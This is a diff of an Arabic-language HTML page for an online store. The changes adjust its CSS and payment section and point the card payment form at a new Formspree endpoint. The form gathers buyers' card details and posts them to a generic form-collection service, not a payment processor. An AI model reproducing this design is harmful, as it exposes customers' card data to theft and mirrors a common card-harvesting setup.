@@ -8,7 +8,7 @@
   <link rel="stylesheet" href="https://unpkg.com/aos@2.3.1/dist/aos.css" />
   <style>
     * { box-sizing: border-box; margin:0; padding:0; }
-    body { font-family: 'Segoe UI', Tahoma, sans-serif; background:#f5f5f5; direction: rtl; }
+    body { font-family: 'Segoe UI', Tahoma, sans-serif; background:#f5f5f5; }
     .navbar { display:flex;justify-content:space-between;align-items:center;
       padding:15px 30px;background:#111;position:sticky;top:0;z-index:1000; }
     .navbar img { height:40px; }
@@ -29,7 +29,7 @@
     .products { display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
       gap:20px;padding:40px; }
     .product { background:#fff;border-radius:10px;overflow:hidden;
-      box-shadow:0 3px 8px rgba(0,0,0,.1);transition:transform .3s; cursor:pointer;}
+      box-shadow:0 3px 8px rgba(0,0,0,.1);transition:transform .3s; cursor:pointer; }
     .product:hover { transform:translateY(-5px); }
     .product img { width:100%;height:200px;object-fit:cover; }
     .product-info { padding:15px; display:flex;flex-direction:column;justify-content:space-between; }
@@ -41,33 +41,65 @@
       transition:background .3s; }
     .buy-btn:hover { background:#e55b50; }
 
+    /* Payment Section */
+    #payment {
+      display:none;
+      background:#fff;
+      padding:30px;
+      max-width:500px;
+      margin: 40px auto;
+      border-radius: 10px;
+      box-shadow: 0 3px 8px rgba(0,0,0,.2);
+    }
+    #payment h2 {
+      margin-bottom:20px;
+      text-align:center;
+      color:#333;
+    }
+    #payment form label {
+      display:block;
+      margin:10px 0 5px;
+      color:#555;
+    }
+    #payment form input {
+      width:100%;
+      padding:10px;
+      border:1px solid #ccc;
+      border-radius:5px;
+      font-size:16px;
+    }
+    #payment form .card-details {
+      display:flex;
+      gap: 15px;
+      margin-bottom: 15px;
+    }
+    #payment form .card-details > div {
+      flex:1;
+    }
+    #payment form button {
+      width:100%;
+      padding:12px;
+      background:#ff6f61;
+      border:none;
+      color:#fff;
+      font-size:18px;
+      font-weight:700;
+      border-radius:5px;
+      cursor:pointer;
+      transition: background .3s;
+    }
+    #payment form button:hover {
+      background:#e55b50;
+    }
+
     /* Contact */
-    #contact { background:#fff; padding:40px; text-align:center; }
+    #contact { background:#fff; padding:40px; text-align:center; margin-top:60px;}
     #contact h2 { font-size:28px; margin-bottom:20px; }
     #contact p { font-size:16px; color:#555; }
     #contact ul { list-style:none; padding:0; margin-top:20px; font-size:16px; color:#333; }
     #contact li { margin:20px 0; }
 
-    /* Payment form */
-    #payment { 
-      background:#fff; padding:40px; max-width:600px; margin:40px auto; 
-      border-radius:10px; box-shadow: 0 3px 10px rgba(0,0,0,0.1);
-      display:none; /* مخفي افتراضياً */
-    }
-    #payment h2 { text-align:center; margin-bottom:25px; color:#333; }
-    #payment form label { display:block; margin-bottom:8px; font-weight:600; color:#333; }
-    #payment form input, #payment form select {
-      width: 100%; padding:10px; margin-bottom:20px; border:1px solid #ccc; border-radius:5px; font-size:16px;
-    }
-    #payment form button {
-      background:#ff6f61; color:#fff; border:none; padding:12px; width:100%; font-size:18px; border-radius:5px; cursor:pointer;
-      transition: background .3s;
-    }
-    #payment form button:hover { background:#e55b50; }
-    .card-details { display:flex; gap:15px; flex-wrap:wrap; }
-    .card-details > div { flex:1 1 48%; }
-
-    footer { background:#111;color:#fff;text-align:center;padding:20px;font-size:14px; margin-top:50px; }
+    footer { background:#111;color:#fff;text-align:center;padding:20px;font-size:14px; margin-top:60px;}
   </style>
 </head>
 <body>
@@ -140,7 +172,7 @@
   <!-- Payment Section -->
   <section id="payment" data-aos="fade-up">
     <h2>نموذج حوالة بطاقة ماستر / فيزا</h2>
-    <form action="https://formspree.io/f/xovljpvw" method="POST" id="paymentForm">
+    <form action="https://formspree.io/f/xwpqvwva" method="POST" id="paymentForm">
       <label for="name">الاسم الكامل:</label>
       <input type="text" id="name" name="name" placeholder="أدخل اسمك الكامل" required />
 
@@ -167,9 +199,6 @@
         </div>
       </div>
 
-      <label for="transaction_number">رقم الحوالة:</label>
-      <input type="text" id="transaction_number" name="transaction_number" placeholder="أدخل رقم الحوالة" required />
-
       <label for="product">المنتج المطلوب:</label>
       <input type="text" id="product" name="product" readonly required />
 
@@ -189,7 +218,6 @@
     </ul>
   </section>
 
-  <!-- Footer -->
   <footer>
     &copy; 2025 goldmc Store. جميع الحقوق محفوظة.
   </footer>
@@ -205,17 +233,14 @@
     });
     AOS.init({ duration: 800, once: true });
 
-    // الدالة اللي تطلع نموذج الدفع مع تعبية المنتج
     function selectProductAndShowForm(productName) {
       document.getElementById('product').value = productName;
       const paymentSection = document.getElementById('payment');
       paymentSection.style.display = 'block';
       paymentSection.scrollIntoView({behavior: 'smooth'});
-      // عرض رابط الدفع في navbar
       document.getElementById('paymentLink').style.display = 'inline';
     }
 
-    // منع ارسال النموذج اذا الحقول مش معبّية صح
     document.getElementById('paymentForm').addEventListener('submit', function(event) {
       if (!this.checkValidity()) {
         event.preventDefault();
